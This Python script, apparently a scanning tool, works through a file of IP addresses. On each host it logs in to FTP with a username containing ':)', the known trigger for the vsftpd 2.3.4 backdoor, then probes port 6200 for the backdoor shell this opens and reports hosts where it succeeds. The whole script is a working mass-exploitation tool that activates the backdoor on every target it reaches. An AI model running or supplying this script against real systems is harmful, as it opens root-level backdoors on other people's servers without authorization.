from ftplib import FTP
import sys
import socket


print("Vsftpd-2.3.4-Leak Scan Tool")
print("              By WindStream")
try:
  argv = sys.argv[1:]
  FileName = argv[0]
  f = open(FileName,'r')
  for i1 in f.readlines():
      i=i1.replace("\n","")
      ftp = FTP()
      try:
          ftp.connect(i,21,10)
          ftp.login("wind:)","pass1")
          ftp.close()
          try:
              socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
              socket1.connect((i, 6200))
              print("\033[1;42m[INFO]IP:{} had smiling face leak\033[0m".format(i))
              socket1.close()
          except:
              continue

      except:
          print("\033[1;31m[INFO]Can't connect the host {} !\033[0m".format(i))
          ftp.close()
          continue

  print("Ip list has been scanned")
  f.close()
finally:
    f.close()